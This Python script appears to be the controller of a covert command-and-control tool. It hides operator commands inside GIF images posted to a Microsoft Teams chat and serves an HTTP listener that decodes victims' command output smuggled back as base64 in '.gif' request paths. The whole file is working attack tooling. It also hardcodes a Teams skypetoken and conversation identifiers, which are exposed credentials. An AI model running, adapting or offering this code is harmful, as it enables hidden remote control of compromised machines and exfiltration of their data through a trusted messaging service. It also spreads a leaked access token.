#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import base64
import threading
import requests
from base64 import b64decode, b64encode
command_history = []
class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def do_GET(self):
        self._set_response()
        if "gif" in self.path and self.path != "/.gif":
            if self.path not in command_history:
                command_history.append(self.path)
                s = self.path
                trimmed = s[:s.find('.gif')]
                trimmed = trimmed.replace("/", "")
                try:
                    trimmed = base64.b64decode(trimmed).decode("utf-8")
                    print(trimmed)
                    command_intake()
                except:
                    trimmed = base64.b64decode(trimmed + '=').decode("utf-8")
                    print(trimmed)
                    command_intake()
    def log_message(self, format, *args):
        return
def command_intake():
    val = input("> ")
    my_str = val
    my_str_as_bytes = str.encode("hello;" + my_str)
    with open("giphy2.gif", "rb") as f:
       original =  (f.read())
    test = ''
    original2 = original + my_str_as_bytes
    base64_gif_encoded = base64.b64encode(original2)
    base64_gif_encoded = base64_gif_encoded.decode()
    test = base64_gif_encoded
    burp0_url = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/19%3A021c78f1-2bc0-48b3-bf26-5a9b7e030133_9e02156d-981c-4a84-b2bf-0c5cc1382b8c%40unq.gbl.spaces/messages"
    token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNCIsIng1dCI6IlJDM0NPdTV6UENIWlVKaVBlclM0SUl4Szh3ZyIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NTI2MjM3NjIsImV4cCI6MTY1MjY5ODk3NCwic2t5cGVpZCI6Im9yZ2lkOjllMDIxNTZkLTk4MWMtNGE4NC1iMmJmLTBjNWNjMTM4MmI4YyIsInNjcCI6NzgwLCJjc2kiOiIxNjUyNjIzNDYyIiwidGlkIjoiNjU2ZDNlMTktNGMzYy00OGNiLTk1N2ItYjViY2UxY2I3YmMwIiwicmduIjoiYW1lciJ9.vMl4YD5i-Ix2D54I8Tw4lzf9T9aOt1hvERhXNjqUQEPguKZN3xuO9ioDIPjKRkxe-KRM3HTcO_gpmzVePmxbsLaX0XpmCIKjBBYry2dw0V0QaRp3jF7L1MDwwq5I9nfSFoYtXoNj4mXsNBscACyZNDuQHgQaDdZQVSSnByZ6nLcJ8ttUwUwWU-dQyKpYA2nhvHqHPb4bpPsy2wftX9JET3nhJggLuztJRUfO31MOw6i4Te5p3W_hpbpjI4CqQZjcK0K3aIjJzrD8Efdw0qgA4qZs6QKTImpQkUSMT_AVJKEd-NxFBOVe3q4MA_Ac20yZCJKxzsalrhmYk0MnuzjbOw"
    burp0_headers = {"Authentication": "skypetoken="+token}
    burp0_json = {"content": "<p>paving<img alt=\"Red Lold\" src=\"data:image/png;base64, %s\" />roads</p>" %
                  (test), "contenttype": "text", "messagetype": "RichText/Html"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
def send_start():
    my_str = "start"
    my_str_as_bytes = str.encode("hello;" + my_str)
    with open("giphy2.gif", "rb") as f:
       original =  (f.read())
    test = ''
    original2 = original + my_str_as_bytes
    base64_gif_encoded = base64.b64encode(original2)
    base64_gif_encoded = base64_gif_encoded.decode()
    test = base64_gif_encoded
    burp0_url = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/19%3A021c78f1-2bc0-48b3-bf26-5a9b7e030133_9e02156d-981c-4a84-b2bf-0c5cc1382b8c%40unq.gbl.spaces/messages"
    token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNCIsIng1dCI6IlJDM0NPdTV6UENIWlVKaVBlclM0SUl4Szh3ZyIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NTI2MjM3NjIsImV4cCI6MTY1MjY5ODk3NCwic2t5cGVpZCI6Im9yZ2lkOjllMDIxNTZkLTk4MWMtNGE4NC1iMmJmLTBjNWNjMTM4MmI4YyIsInNjcCI6NzgwLCJjc2kiOiIxNjUyNjIzNDYyIiwidGlkIjoiNjU2ZDNlMTktNGMzYy00OGNiLTk1N2ItYjViY2UxY2I3YmMwIiwicmduIjoiYW1lciJ9.vMl4YD5i-Ix2D54I8Tw4lzf9T9aOt1hvERhXNjqUQEPguKZN3xuO9ioDIPjKRkxe-KRM3HTcO_gpmzVePmxbsLaX0XpmCIKjBBYry2dw0V0QaRp3jF7L1MDwwq5I9nfSFoYtXoNj4mXsNBscACyZNDuQHgQaDdZQVSSnByZ6nLcJ8ttUwUwWU-dQyKpYA2nhvHqHPb4bpPsy2wftX9JET3nhJggLuztJRUfO31MOw6i4Te5p3W_hpbpjI4CqQZjcK0K3aIjJzrD8Efdw0qgA4qZs6QKTImpQkUSMT_AVJKEd-NxFBOVe3q4MA_Ac20yZCJKxzsalrhmYk0MnuzjbOw"
    burp0_headers = {"Authentication": "skypetoken="+token}
    burp0_json = {"content": "<p>paving<img alt=\"Red Lold\" src=\"data:image/png;base64, %s\" />roads</p>" %
                  (test), "contenttype": "text", "messagetype": "RichText/Html"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    try:
        send_start()
        command_intake()
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')
if __name__ == '__main__':
    from sys import argv
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
